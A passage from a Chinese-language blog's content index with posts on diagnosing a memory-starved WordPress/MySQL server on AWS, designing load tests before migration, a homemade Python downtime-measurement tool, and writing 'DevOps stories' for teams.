#完成了以上三个阶段，我们才可以说基本上完成了一个应用程序迁移到云计算平台上的基础步骤。如果你的应用迁移到了云平台上并做到了以上的三个阶段，才算是及格。\n云计算所带来的改变并不仅仅是可靠的廉价租赁式资源，还会改变组织的工作方式。特别是 DevOps 运动的兴起又为 CloudNative 的产品研发运营增加了新的助燃剂。关于构建 DevOps 团队更多的内容和套路，请参见我的 GitChat 达人课：“DevOps 转型实战”。\n","date":"August 8, 2018","permalink":"/blog/2018/2018-08-08-architecutre-optimization-case-study/","section":"Blogs","summary":"","title":"公有云(AWS)上的生产环境架构优化案例和迁移套路总结"},{"content":"本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的前半部分，本文对原文有所修改和总结。交流实录请点击这里。\n案例背景 #案例是一个泰国网站的生产环境（请脑补一句“萨瓦迪卡”，为了叙述方便，下文中均以\u0026quot;萨瓦迪卡\u0026quot;指代这个网站。）“萨瓦迪卡”是一个 采用 Wordpress + MySQL搭建的应用。这个遗留系统已经工作了五年。客户已经把在其它 VPS 上平移到 AWS 上。平移（lift and shift）是说原样复制，而迁移（migration）还要进行改造。而客户唯一发挥 AWS 优势的一点就是用了一个配置很高的 EC2 虚拟机 —— m4.4xlarge。这样一台配置的虚拟机有 16 个虚拟 CPU，64 GiB 的内存，以及 2000 Mbps 的网络带宽，最高 3000 IOPS 的 200GiB 的块存储设备（也就是硬盘）。\n知识点： GiB 是用二进制计算的，GB 是用十进制计算的。1 GiB 是 2的30 次方，而1 GB 是10 的 9 次方，1 GiB 略大于 1GB。 而且，AWS 的 FreeTier 免费计划是按 GB 计算的哦！\n除了基本的网络和虚拟机以外，“萨瓦迪卡” 的所有东西都放在一台虚拟机上。没错，是所有东西——Web 服务器，反向代理，数据库，上传的文件——都放在一台虚拟机上。唯一个一个负载均衡用来承载 HTTPS 证书，没有使用集群，没有高可用，没有数据库/应用分离，没有防火墙，没有 WAF，没有 APM，没有 CDN 而且，没有持续交付流水线，所有部署都要 ssh 到机器上进行操作。如图所示：\n“萨瓦迪卡”的生产环境可以被认为是一个裸奔的肉鸡。我曾经一度它已经被轮番入侵很久了，只是还没有被发现而已。而且，“萨瓦迪卡”生产环境的唯一一台服务器的内存率使用经常超过 95%，我很担心它的状况，任何一个小的 DoS，都不需要 DDoS，就可以让它整站宕机了。\n我于是把我的担忧汇报给了客户，客户也意识到了问题。在我发现问题之前的一个月就启动了“萨瓦迪卡”的翻新（Revamp）项目，让这个应用保持原样（Keep it as is），直到 6 个月后新项目上线，替换掉当前应用。\n然而，没想到我一语成谶。一天，“萨瓦迪卡”被删库了！\n\u0026ldquo;删库？别慌！\u0026rdquo; #作为一个运维工程师，最悲催的事情就是“人在家中坐，锅从天上来”。这天是世界杯的某一场小组赛，而我刚吃完晚饭正在洗碗。突然被客户的 P1 告警（P1 - Priority 1，最高级别告警）惊吓到，得知“萨瓦迪卡”被删库了。\n判断的依据是：\n“萨瓦迪卡”主页打开是 Wordpress 的初始化安装页面。证明应用是正常的，数据不在了。 在服务器上用 MySQL 客户端登录数据库，找不到“萨瓦迪卡”的数据库。 还好客户每天有全量数据备份，于是客户快速从全量备份恢复了数据库，只是缺少了从备份点到故障点的业务数据。全量数据库的备份文件有 10 GiB，这么大的表如果采用 mysqldump 会因为锁表而导致 10 分钟左右的停机时间（别问我怎么知道的）。\n问题分析 #在恢复应用的同时，我们也开始进行了分析的工作。首先，我们怀疑是被攻击了。于是通过 AWS 的 CloudTrail（一种审计工具，用来记录登录 AWS 用户的操作）和 主机上的命令历史（history 命令）和登录日志进行分析，结果一无所获。其次，我开始检查 MySQL 的日志（/var/lib/mysql/*.err），在日志上发现如下片段：\nInnoDB: Log scan progressed past the checkpoint lsn 126908965949 180622 17:21:09 InnoDB: Database was not shut down normally! InnoDB: Starting crash recovery. \u0026lt;此处省略很多行\u0026gt; 180622 17:21:32 InnoDB: Initializing buffer pool, size = 3.0G InnoDB: mmap(3296722944 bytes) failed; errno 12 180622 17:21:32 InnoDB: Completed initialization of buffer pool 180622 17:21:32 InnoDB: Fatal error: cannot allocate memory for the buffer pool 180622 17:21:32 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; init function returned error. 180622 17:21:32 [ERROR] Plugin \u0026#39;InnoDB\u0026#39; registration as a STORAGE ENGINE failed. 通过分析，我们发现 mysql 发现自己有问题的时候尝试恢复数据库，但因为虚拟机可用内存不足而加载存储引擎失败，导致找不到数据库。因此，解决方案有以下三种：\n采用工具进行对 mysql 服务器参数进行调优。 扩大内存，换个配置更高的虚拟机。 将应用和数据库部署在不同的虚拟机实例或者 RDS （关系数据库服务）上。 而三种有各自的问题：\n对于方案1，数据库调优需要频繁重启。对于生产环境来说，必须在低流量的时段（一般是夜间）进行。而且所花时间未知且效果很难保证。由于资源有上限，且进程相互影响，很难发现问题。所以风险较高，价值有限。\n对于方案2，需要对虚拟机进行不停机镜像复制，因此会导致部分数据丢失，而且数据同步恢复困难大。而且，不知道需要多少资源的虚拟才足够。问题同方案1，只不过由于资源更多，下次出现同样问题的时间更晚罢了。这个方案的风险虽然比第一种小，但用空间换时间的价值仍然有限，不晓得能撑到什么时候。而且，可能会带来一定的资源浪费。\n方案3是风险最小，价值最大的方案。它将数据作为核心资源并托管至高可用服务上，有效了隔离了风险，保护了数据的可用性。但唯一的缺点就是对于需要的资源和性能是未知的。因此，在实施这个方案之前，我们需要进行性能测量。\n你可能会想，只需要增加一些基础设施监控和 APM （Application Performance Monitoring，应用性能监控）就可以得到相应的数据了。然而，在生产环境的性能度量没那么简单。\n**首先，我们要保证生产环境的业务连续性。**APM 也是一种应用程序，也会占用资源，你如何确定安装和运行 APM 的过程不会造成生产环境停机？其次，如果一定会造成停机，那么会停机多久？当这些问题都是未知的情况下，鲁莽的行为只能增加更多的不确定性风险。\n因此，在迁移之前，我们要模拟生产环境进行度量并进行分析。\n设计性能度量 #性能度量是一个从“未知”到“已知”的过程。\n**首先，你需要明确所要度量的问题。**你可以和你的小组一起商定需要解决的问题。在上面这个案例里，我们所需要回答的问题包括：\n正常运行应用程序需要多少内存？ 正常运行数据库需要多少内存？ 进行哪些操作会导致停机时间？停机时间会持续多久？ 资源使用对性能的影响有多少？ 性能拐点在哪里？ 当然，对于 CPU，网络和存储，你也可以设计以上的问题。\n然后，找到数据基线 (Benchmark) #由于资源的使用是和用户访问数量息息相关的，你还需要知道资源使用的均值，峰值， 边际值。\n均值是资源使用基线，也就是最小值。\n峰值是资源使用的警告线，如果过去发生过这么高。\n边际值是指每单位的用户请求所消耗的资源。\n一般来说，这些数据都可以从云计算提供商的非侵入式监控服务获得，它的数据收集不会影响资源的性能。例如 AWS 的 CloudWatch 。我们可以根据过去 6 个月或者 3个月的时间来估计均值和峰值。**但由于未来是不确定的，因此过去 6 个月或者 3 个月的数据是建立在“未来访问量不会突变”的假设基础上的。**例如，如果有类似于“6·18” 或者 “双十一” 的流量高峰，则日常的数据参考意义不大。\n如果缺乏这样的手段，就要通过复制生产环境来度量了。\n复制生产环境 #复制生产环境的一点原则就是“尽量减少不同”，尽可能的按照生产环境的配置来构建你的沙盒环境以得到更接近真实的数据。很多云提供商都提供镜像（Image）或者快照（Snapshot）的功能用来复制当前有状态的资源。有时候二者是同一个意思。如果有区别，二者的区别在于以下几点：\n镜像是全量，快照是增量。 镜像的构建需要停机，而快照不需要。 镜像生成时间长，快照生成时间短。 镜像不能指定时间点部分还原，快照可以根据时间点部分还原。 无论是哪一种，我们都要选择一个对生产环境影响最小的方案。在 AWS 中，我们可以根据当前的虚拟机实例构建虚拟机镜像 AMI （Amazon Machine Images）。它提供两种方式：一种是不重启（no reboot），这种方式的缺点是会造成构建镜像时间点以后的数据丢失。另外一种是在构建之前重启实例，这样不会导致数据丢失。\n**对于上述的案例来说，生产数据的完整性并不会影响我们的度量，因此，无需重启实例。**但如果你要度量重启实例会带来多少数据丢失，则需要重启实例。\n此外，为了保证你不会误操作，我建议你在非生产环境的云计算账号下重建应用。如果你一定要在同一个账户中进行复制，请确保你做好了生产环境资源隔离。\n设计测试场景 #当你在测试环境下复制了生产环境，你就有了一个安全的沙箱来进行测试了。当我们开始进行性能测试的时候，我们要通过“整体”的测试来计算对“局部”的影响。并找到。以“萨瓦迪卡”为例，我们通过 AWS 上的数据得到了“萨瓦迪卡”生产环境的平均响应时间：0.2 ~ 0.4 秒，RPM（Requests Per Minute 每分钟请求）大概在 4500 左右。\n因此我们设计了如下测试场景：\n空闲使用率：0 请求的时候，资源使用率。 1 个，10 个，20 个 并发请求的时候，资源使用率和响应时间，用于计算边际资源使用率。 RPM 和生产环境 RPM 均值相等的情况下，资源使用率和响应时间。 2 倍 ，4 倍， 10 倍 生产环境 RPM 均值的情况下，资源使用率和响应时间。 模拟生产环境的 RPM 增长速度（逐步增加请求到相应值，例如 5 分钟增长到 2000 RPM）进行测试。 模拟生产环境极限 RPM 增长速度（一次增加请求到对应值，例如 5 秒钟增长到 2000 RPM）进行测试。 根据以上的测试场景，我们可以构建资源使用率和响应时间之间的关系。\n如果你有 CDN 或者 URL 访问分析数据，可以它来构建你的测试案例。如果什么没有，例如“萨瓦迪卡”这种情况，你就可以使用主页的 URL 来进行测试。常用的工具有 Selenium， Jmeter 和 Gatling。你可以用 Selenium 录制一个用户访问的脚本，来模拟用户访问。你也可以通过 Jmeter 或 Gatling 来增加并发进行负载测试，后者能提供更加有用的信息。\n如果你无法模拟足够多的真实用户数据，把以上的工具生成的脚本或配置放到 flood.io 上运行，得到更好的参考报告，如下图所示： 如果你需要度量某些操作的停机时间，你可以在进行负载测试的时候进行操作。也可以使用我写的小工具 wade （Web Application Downtime Estimation）来测试。关于 wade 的故事可以参考 一怒之下，我写了一个开源流量测试工具。\n通过模拟“萨瓦迪卡”的访问数据，我得到了以下数据：\n当 Web 服务器（Apache）重启完，仅有健康检查访问的情况下，系统占用 367 MiB 内存。 数据库占用 10 GiB 左右内存，也就是说，给 Web 应用剩下的内存有 53 GiB 左右。 分别度量了 1个用户，10 个用户，20 个用户并发访问下的内存使用情况。平均每处理一个请求，最多需要消耗 133 MiB 内存。 也就是说，剩下的内存最大能服务 400 个左右的用户的并发访问。如果超过 400 个用户，系统会因为资源不足而宕机。 升级虚拟机 Linux 中的软件包和安全补丁会带来 5 秒钟左右的停机。 APM （NewRelic）的安装会占用 63 MiB 左右内存且无停机时间。 编写性能度量报告 #当我们完成了性能度量的时候，就要编写一份性能度量报告。性能度量报告包含以下 6 个部分：\n背景：主要回答为什么（Why）要做这一次性能度量。 关键问题：通过性能度量期望知道哪些问题（What）。 测试设计：主要介绍度量方法（How），以及度量方法中的注意事项。 测试条件：由于是模拟测试，要强调与真实值的匹配情况，哪些部分重要，哪些部分不重要。 测试数据结果：采用工具得出的真实数据，要有源可查，最好是截图。 结论：根据数据的计算解答第 2 步 提出的关键问题。 建议：根据度量数据得出的下一步优化建议。 至此，我们完成了对生产环境性能的分析。接下来，就要为性能设计架构迁移方案了。请关注下篇《 AWS 上的生产环境架构优化案例》\n","date":"August 7, 2018","permalink":"/blog/2018/2018-08-07-performance-analysis-case-study/","section":"Blogs","summary":"","title":"公有云(AWS)上的生产环境性能分析案例"},{"content":"继一怒之下我写出了 Vivian（详见“ 测试驱动开发 Nginx 配置”）之后。又在等待客户审批流程的时间里自己写了一个流量测试工具。\n背景 #客户的站点是通过 Wordpress 搭建的，这个应用放在一台 EC2 虚拟机上。奇葩的是，这个应用的 MySQL 数据库也在这台虚拟机上，之前做过一次 RDS 迁移，失败了，原因未知。看起来这个应用和数据库就像筷子兄弟一样，不离不弃，而且没有办法通过 AutoScaling Group 进行水平扩展。也就是说，所有的东西都在一台虚拟机上。\n我所要做的，就是把这个架构重新变成可自动水平扩展且高可用高性能有缓存低消耗具备监控和更加安全且有版本控制并可以通过持续交付流水线来半自动部署的架构。你可以重新读一下上一句加粗文字的内容。没错，目前他们连版本控制都没有，所有的操作在服务器上通过 mv 之间 scp 进行。\n很不巧的时候，这个“筷子兄弟”应用在上周开始，晚上随机的 Down 机，表现为数据库被删。但通过日志可以发现，是由于内存资源不足导致的 MySQL 数据引擎加载不了导致的。\n由于需要做“筷子兄弟”拆分手术，目的是要把数据库和应用程序分开，并且需要进行一些服务的重启和拆分。这些操作中会导致停机时间，为了能够度量这个停机时间，便于做出更好的决策，客户希望在测试环境上能够通过模拟生产环境的工作状态来完成这个任务。我设计了方案，包括以下几点：\n知道每一个可能引起停机的操作引起停机的时长。 测试 RDS 能带来多少的性能提升。 找出整个架构引起停机的根本问题。 在 500 个并发用户访问的情况下，会出现的性能拐点。 能够度量应用的资源损耗。 客户已经购买了 NewRelic 和 Flood.io （我在 17 期技术雷达里提交的条目，叉会腰。）但是 Flood.io 的账号分配需要一个额外的审批才可以使用，也就是说，我得等到第二天才能使用。\n我想，也许 github 上会有这样的工具能够满足我这个简单的需求，搜了一圈，没有合适的。\n于是，一怒之下，我用了大概两个小时的时间用 Python 编写了这样一个测试工具。\n工具的设计 # There are only two hard things in Computer Science: cache invalidation and naming things.\n\u0026ndash; Phil Karlton\n命名是一件很困难的事情。于是，为了纪念这个事情，一开始我用提出这个需求的客户的名字（Dave）来命名它，但可能不太好记忆。所以最后还是用 Wade （Web Application Downtime Estimation）作为这个工具的名字。它很简单，可以在https://github.com/wizardbyron/wade找到。\n如果我需要知道停机时长，我必须要先能够持续不断的发出 http 请求，并记录下相应 状态不是 200 OK 的返回。我并不希望应用是一个死循环，因此我需要能够加入时间控制。我期望用下面的这样的方式来使用：\nwade -t 10 -u https://www.google.com\n其中，-t 代表时间，10 代表持续分钟，-u 表示要测试的 url。我期望这个工具能够连续的帮我输出每次请求的时间和 HTTP 状态字。\n例如：\n1 2 3 [2018-07-05 22:30:57]status:200 [2018-07-05 22:31:08]status:200 [2018-07-05 22:31:15]status:200 这个需求其实很简单，我大概花了半个小时就完成了。\n在实际应用中，你需要先运行这个程序，然后再执行那些可能引起停机的操作。于是我准备让它运行30分钟，因为这些操作会执行多久我并不清楚。\n很好，经过测试，这些操作只会引起 5 秒左右的停机。\n不过，我好像忘了一个重要的事情…… #那就是这个应用是单线程的，也就是说，这个实际上和真实的场景相差很远。我需要能够有 500 个并发 HTTP 请求，于是我把它改造成了多线程的。我期望用下面的这样的方式来使用：\nwade -t 10 -n 5 -u https://www.google.com\n其中，-n 代表线程数量。\n有了多线程，我就需要改变这些应用的输出。对于多线程应用，输出需要知道每个线程的执行情况并且要能够汇总。因此，我期望应用能够这样输出：\n1 2 3 4 5 {\u0026#39;Thread\u0026#39;: 0, \u0026#39;2XX\u0026#39;: 2, \u0026#39;3XX\u0026#39;: 0, \u0026#39;4XX\u0026#39;: 0, \u0026#39;5XX\u0026#39;: 0} {\u0026#39;Thread\u0026#39;: 3, \u0026#39;2XX\u0026#39;: 2, \u0026#39;3XX\u0026#39;: 0, \u0026#39;4XX\u0026#39;: 0, \u0026#39;5XX\u0026#39;: 0} {\u0026#39;Thread\u0026#39;: 1, \u0026#39;2XX\u0026#39;: 4, \u0026#39;3XX\u0026#39;: 0, \u0026#39;4XX\u0026#39;: 0, \u0026#39;5XX\u0026#39;: 0} {\u0026#39;Thread\u0026#39;: 4, \u0026#39;2XX\u0026#39;: 4, \u0026#39;3XX\u0026#39;: 0, \u0026#39;4XX\u0026#39;: 0, \u0026#39;5XX\u0026#39;: 0} {\u0026#39;Thread\u0026#39;: 2, \u0026#39;2XX\u0026#39;: 4, \u0026#39;3XX\u0026#39;: 0, \u0026#39;4XX\u0026#39;: 0, \u0026#39;5XX\u0026#39;: 0} 因为，其实3XX 类的返回值在某些情况下也应该算是正确，而 4XX 和 5XX 类的返回值应该分开统计。因此，我改进了一下这个工具。\n在改进后我重新测试，我找到了问题的答案：\n我成功的把数据库迁移到了 RDS 上，并在测试环境实例上停止了 MySQL 进程，带来了 40 倍的性能提升。发现这个应用的数据库需要最少 10 GB 的内存才能正常工作。\n当我以 500 个线程去持续请求的时候，我把服务器弄挂了。输入的响应很慢，且执行命令会返回-bash: fork: Cannot allocate memory 的错误。通过减少进程数，我发现一个用户请求会占用 110 MB 左右内存，要满足 500 个用户的并发访问，主机需要最少 64 GB 的内存。\n由于并发用户增长的同时，内存也在增长，物理内存用完之后会使用 Swap 区的虚拟内存空间。当 Swap 区的空间占满后，这个时候因为没有可分配内存，所以应用响应奇慢。即便是我终止了测试请求，仍然没有缓解，我猜之前的请求已经在 HTTP 端排队，在请求没有结束或者超时释放资源，后续的请求会继续排队。\n那个…… 好像，我刚才对这个服务器进行了一次 DoS （拒绝服务）攻击。\n加载了 NewRelic，我发现这个应用在加载首页的时候性能是最低的，而大部分的资源都消耗在了 select 查询上。因此，我判断其中的表或者数据有问题，会进行大量加载。其次，可以通过给首页增加页面缓存，或者在数据库库端加入缓存，来缓解资源占用。毕竟，首页的访问时最频繁的。\n最后，我们可以把 wade 在测试中度量到的数据当做是架构演进中的验收测试或者冒烟测试，集成在持续部署流水线中，在变更基础设施或者部署应用之后执行。我们需要非功能的架构级别的自动化测试来保护应用架构的重构。\n反思 - 少即是多 #如果没有这个工具，想得到以上的答案。我需要同时在三个服务（AWS CloudWatch, NewRelic, Flood.io）之间来回切换，并且搜集到需要的数据。那么多的数据，找到一个简单直接能反应问题的数据也很困难。而在等待账号审批的过程中，我就写下了这个工具。这个工具覆盖了客户会关心的基本场景和数据之间的关系。而这三个工具不能同时都满足（其实NewRelic 其实就差一点点）。虽然每个工具在各自领域 和所面对的客户都是非常强大的工具，而一个真实客户需求的场景 - 找到在正常压力下影响停机时间的因素 - 却很难被满足。\n所以，对于非目标的用户和使用场景，产品丰富的功能和数据有可能是需要被过滤的噪音。一个产品所要面对的用户场景越多样，它所引入的噪音就会越多。而更多的增值服务和高价值服务，则被淹没在了这样的噪音里。\n支付宝和银行的手机端应用就有这样的问题，什么都做的事情，一般什么都做不好。\n最后 #作为一个两个小时之内完成的工具，wade 缺乏各种自动化测试。但是，从 wade 设计过程我们可以看出，虽然我没有写自动化测试，但是设定期望并完成期望的结果是一致的。从这个角度上讲，TDD 也是把大脑中对程序的设计过程记载下来的一个活动。\n","date":"July 7, 2018","permalink":"/blog/2018/2018-07-07-why-do-i-write-wade/","section":"Blogs","summary":"","title":"一怒之下，我又写了一个开源流量测试工具"},{"content":"在 2009 年第一届 DevOpsDays 上，《敏捷教练》的作者 Rachel Davies 作为第一届 DevOpsDays 上的第一位分享嘉宾。分享了在 BBC 采用用户故事跟踪非功能需求的经验。然而这一实践并不如 DevOps 的其它实践那样广泛。这个实践实际上很简单，就是把非功能需求做为用户故事的 AC 放入故事卡里。\n在我过去实践 DevOps 的经历里，发现每次开始的时候都需要团队做同样的一些事情。而这些事情往往是和用户故事独立的，不能作为用户的一部分体现在工作量里。但这些事情又提升了团队之间的 DevOps 能力，于是，我把这一类的工作固化为 DevOps 故事用来落地 DevOps 实践，而且 DevOps 故事同样遵循并体现 CLAMS 原则的。\n所谓 CLAMS 原则，指的是：\nCulture（文化） Lean（精益） Automated （自动化） Measurement （度量） Sharing （分享/共担责任）\n我把一个团队是否遵循 CLAMS 原则当做是否正确实践 DevOps 的标准之一。\nDevOps 故事由 DevOps Epic （DevOps 史诗）和 DevOps Story （DevOps 故事）组成。和用户故事对应，DevOps 史诗故事可以依据具体情况的不同拆分成不同的 DevOps 故事。\n而无论 DevOps 史诗 还是 DevOps 故事，都包含以下三个因素：\n一定包含 Dev 和 Ops 两个方面\n一定包含 Dev 和 Ops 核查的内容\n一定包含可以度量的内容\n编写 DevOps 史诗故事 #DevOps 史诗故事对于大部分组织来说是类似的，因为这些场景是 DevOps 的核心特征。也就是说，当你的团队完成了 DevOps 史诗故事。那么，你的团队就可以被称作是 DevOps 团队。\n一个 DevOps 的史诗故事格式如下：\n作为一个 DevOps 团队 应该采用*\u0026lt;某一种 DevOps 实践\u0026gt;* 团队中的Dev*\u0026lt;应该如何做\u0026gt;* 团队中的Ops*\u0026lt;应该如何做\u0026gt;* 得到\u0026lt;什么样的结果\u0026gt; 可以获得*\u0026lt;什么益处\u0026gt;，从\u0026lt;某一度量指标\u0026gt;*中得到。\n举例1：持续部署流水线 # 作为一个 DevOps 的团队， 应该采用 持续部署流水线 团队中的 Dev 提交代码后 团队中的 QA 可以根据需要部署相应版本 团队中的 Ops 无需操作 就可以看到应用部署在生产环境上 可以 提升交付速度，通过部署时间度量 可以 提升反馈速度，通过部署频率度量 可以 节约 Ops 的部署时间，通过 Lead Time 度量\n举例2：基础设施即代码 #作为一个 DevOps 的团队，\n应该采用 基础设施即代码\n团队中的 Dev 用代码构建和生产环境开发环境\n团队中的 Ops 需要通过代码和配置构建基础设施\n就可以 看到应用部署在生产环境上\n可以 提升交付速度，通过部署时间度量\n可以 提升反馈速度，通过部署频率度量\n可以 节约时间，通过 Lead Time 度量\n可以 减少人为变更失误次数和变更失败次数\n以上的两个例子中，都包含了 DevOps 史诗故事的几个原则:\n首先，DevOps 作为一个团队属性，放在第一行标识了出来。这是为了向团队强调 DevOps 的概念。\n其次，需要注明 DevOps 所采用的最佳实践，在这里，最佳实践是不需要有具体的实施工具的。具体的实施工具要在 DevOps 故事里体现。\n然后，下来的几行包含了各个角色要达成的效果，以及最终的效果。这里体现了 CLAMS 里 Culture 和 Share （分担）的原则。\n最后，要标明 DevOps 史诗故事带来的益处以及度量方法。这里体现了 CLAMS 里的 Measurement 原则。\n然而，仅仅有了 DevOps 史诗故事是没有办法落地的，我们还需要更加具体的 DevOps 故事来辅助。\n编写 DevOps 故事 #DevOps 故事的原则要比 DevOps 史诗更加具体，并分成两种不同的故事。一种叫做“给 Dev 的 DevOps 故事”（DevOps Story for Dev），另一种叫做“给 Ops 的 DevOps 故事”（DevOps Story for Ops）。两者的格式相同， 但内容不同。\nDevOps 故事的编写原则如下：\n只包含某单一角色\n和某一史诗故事关联\n包含所用 具体技术和最佳实践\n完成的效果\n可以自动化 (可选)\n要有 AC，定义什么算完成。\nDevOps 故事的格式如下：\n作为 DevOps 团队里的 \u0026lt;角色\u0026gt; 要实现 \u0026lt;某一 DevOps 史诗故事\u0026gt; 要采用 \u0026lt;什么工具\u0026gt; 完成 \u0026lt;什么事情\u0026gt; 对 \u0026lt;另一角色\u0026gt; 带来什么好处\n例如，对于上文的持续部署流水线的 DevOps 史诗故事就可能会有以下几个 DevOps 故事组成：\nDevOps 故事1 # 作为 DevOps 团队里的 Ops 要实践持续部署流水线 我需要采用 Jenkins 作为持续集成服务器管理持续部署 让 Dev 提交的代码可以通过持续部署流程 让 QA 可以部署到测试环境上验证功能 验收条件：\n有 jenkins 服务器对应的 URL 有 每个用户的用户名和密码 Lead Dev 具有管理权限和配置权限 其它 Dev 具有执行权限 QA 有部署在测试环境和生产环境上的权限 DevOps 故事2 # 作为 DevOps 团队里的 Ops 要实践持续部署流水线 我需要采用 Gitlab 作为代码仓库，提交代码。 让 Dev 可以提交代码。 验收条件：\n采用自动化的方式创建一个 Gitlab 服务器。 在 Gitlab 上创建一个代码库。 给 Jenkins 配置对应的访问权限。 DevOps 故事3 # 作为 DevOps 团队里的 Dev 要实践持续部署流水线 我需要用 git 提交代码并实现 单一主干发布分支 让 Ops 通过 Master 分支发布 让 Dev 在开发分支上开发 让 QA 可以选择对应的提交进行部署测试 验收条件：\n创建一个 Jenkins Job，跟踪代码库 Master 分支的变化 Master 分支如果有变化，自动立即构建并部署到开发环境。 测试环境和生产环境不能直接部署。 通过以上三个 DevOps 故事，我们可以看出：完成一个 DevOps 史诗故事是需要不同角色的共同参与的，而且每个角色都能通过自己的 DevOps 故事让其它团队成员获益。此外，在以上三个 DevOps 故事中，都包含了 DevOps 故事的几个原则：\n一个 DevOps 故事有且只有一个角色执行。\n和 DevOps 史诗故事一致，对应的度量指标和 DevOps 史诗故事也一致。\n包含具体工具和具体工具的实践。\n包含对其它团队成员的操作指引。\n虽然并不是每一个 DevOps 故事都可以自动化，但是自动化是需要第一考虑的因素。\n用 DevOps 故事塑造 DevOps 文化 #通过以上例子你可以感觉到，DevOps 故事实际上就是一个 DevOps 实践的落地说明。它采用 史诗故事确立了 DevOps 的文化和原则。有用具体的 故事 指导每个成员的技术实践。通过每日站会，我们在不断通过重复和强化每个人对 DevOps 文化和原则的认识。\n有人曾经说文化无法落地和改变，这句话说对了一半。\n作为 《DevOps Handbook》 的合著者之一，以及 DevOps 的早期布道者。 John Willis 的 “DevOps Culture（Part1）” 这篇文章里，引用了 一句话：\n“You can’t directly change culture. But you can change behavior, and behavior becomes culture”\n翻译过来就是：你无法直接改变文化，但是你可以改变行为，行为会演变成文化。\nDevOps 故事就是通过类似于用户故事的方式将 DevOps 的相关行为可视化并落地的一个方法。这也给 Scrum Master 和敏捷教练一个指导团队落地 DevOps 的工具。\n正确的认识和使用 DevOps 故事 #DevOps 也有 INVEST 原则 #DevOps 故事源于我在学习用户故事（User Story）中受到的启发。而用户故事中最重要的原则就是，INVEST 原则，它们分别是以下六个单词的缩写：\nIndependent：独立的 Negotiable：可讨论的 Valuable：有价值的 Estimateable：可估计的 Small：小的 Testable：可测试的\nDevOps 故事和 用户故事都满足 INVEST 原则。然而，这六个原则在 DevOps 的上下文里则需要一点补充和解释：\n由于 DevOps 故事的价值不是最终用户（End-User），因此所有的原则是对内部用户（Internal User）讨论的。Internal User 包括团队里的 Dev、Ops、BA、QA、UX、PM 等等角色。\n对于 Independent （独立的）原则而言，在用户故事的上下文里，是要避免故事间的相互依赖。但在 DevOps 故事里，是指角色独立。也就是说，每个角色所做的事情是独立的。但是这些角色之间的故事可能是相关，甚至是依赖的，我们需要对这样的 DevOps 故事按照依赖关系排列优先级。\n对于 Negotiable （可讨论）原则而言，在用户故事的上下文里，是对功能的简短描述，细节将在客户和开发团队的讨论中产生。但是在 DevOps 故事里，是指最终达成 DevOps 的效果是依据团队的构成不同可讨论的，目的是要让 DevOps 在团队资源能力水平合适的方式下落地，而不是提出一个无法达到的要求。此外，DevOps 史诗故事是对 DevOps 落地的简要描述，而 DevOps 故事是对 DevOps 落地的详细描述，在 DevOps 史诗故事中，可以讨论的余地并不多，它代表了某一种最佳实践，而这样一种最佳实践是有上下文的。而 DevOps 故事，则是某一种最佳实践的具体落地，团队可以讨论商议具体的落地内容。比如：对于没有 Github 访问条件团队，我们可以讨论用 Gitlab 服务器。如果团队不会用 git ，可以讨论使用 SVN 或者 CVS。而对于 DevOps 史诗故事来说，这些细节是无关紧要的。\n对于 Valueble (有价值）原则而言，这个价值体现在两个方面：一个方面是对最终用户的价值，被称之为外部价值，这点和用户故事是一致的。另外一个方面是对团队的内部价值，这里是要在编写 DevOps 史诗故事和 DevOps 故事的时候就要明确的。每一个具体的实践对某一具体的角色提供了什么价值。\n对于 Small（小的）原则而言，这里的控制维度是按 AC 的可完成性而言，如果每一个 AC 都是通过讨论可以明确完成的，这样的 DevOps 故事就是小的，而跟时间无关。和用户故事相同的地方是，如果某一个 DevOps 故事因为不确定而复杂，可以将它分成两个故事：一个做调研的故事和一个完成的故事。这里需要强调注意的是，调研故事必须有进度产出。举个例子，如果 DevOps 故事的内容是要做监控管理，团队不清楚应该用哪种工具或者框架。我们就需要一个调研工具的 DevOps 故事，而这样一个调研故事，是需要每天，甚至每半天要有产出分享的。这是遵照了 CLAMS 里的 Share（分享）原则。因此，在 DevOps 上下文里，分享不是一个可选项，是一个必选项。\n对于 Testable（可测试）原则而言，测试是每个角色的职责，这体现了 CLAMS 原则的 Share（共担）原则，而不仅仅是最终用户。和用户故事相同的地方在于：无论什么时候，只要有可能，就要把测试自动化，这也体现了 CLAMS 原则里的 Automation（自动化）原则。\nDevOps 故事不同于技术卡（Technical Card） #有些读者可能会发现 DevOps 故事有点像某些项目里的技术卡。但它们有以下几点不同：\nDevOps 故事更强调团队对 DevOps 文化和原则的落地。而技术卡强调是某一技术的创建或者变更。\nDevOps 故事中的技术是手段，目的是最佳实践。而技术卡可以是仅仅是技术工具本身。\nDevOps 故事中强调技术对团队的价值。而技术卡可以不用考虑这一点。\nDevOps 故事不同于非功能需求（Non-Function Requirements） #DevOps 故事不同于非功能需求主要是面向用户不同：DevOps 故事是对于应用交付团队或者内部用户（Internal User）的。而非功能需求是针对于引用最终用户（End-User）的。因此，它们的关系也不一样。用户故事是应用功能的一部分。而 DevOps 故事是和应用功能无关的。\n请用 CLAMS 原则和 INVEST 原则校正你的 DevOps 故事 #当你开始编写 DevOps 故事的时候，可能会出现一些问题，这不要紧。你需要编写 DevOps 故事之前，要牢记 CLAMS 原则。当你举棋不定时，团队是最好的答案来源，因为 DevOps 是关于团队本身，而不是终端用户的事情。不过当你开始咨询团队的意见之前，请和团队达成 CLAMS 原则的共识，在这样的共识之下，做出什么样的 DevOps 故事都会通过度量和反馈机制来衡量效果。\n此外，DevOps 故事的 INVEST 原则也可以帮助你更好的实践 DevOps 故事。我采用 DevOps 故事作为落地 DevOps 的方法的时间和案例始终都很有限，还有更多未知的情况等待区处理。但我始终不忘用 CLAMS 原则去审视它。如果你发现有无法处理的状况，欢迎来信和我一起讨论，并形成新的 DevOps 实践。\n","date":"June 24, 2018","permalink":"/blog/2018/2018-06-24-devops-story/","section":"Blogs","summary":"","title":"采用 DevOps 故事落地 DevOps"},{"content":"","date":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"2017年中，我参与了一个亚太地区互联网公司并购的项目，客户收购了亚太地区 7 个国家的同行业互联网企业和产品。我作为其中的 DevOps 咨询师和 DevOps 工程师，和客户一起完成并购后的产品迁移和技术能力提升的设计、实施和培训。\n客户希望采用新的统一产品，并根据不同地区的业务特色进行一些定制，与此同时，需要进行数据迁移以保证业务可以继续运行。其中一个很关键的步骤是把原系统的 URL 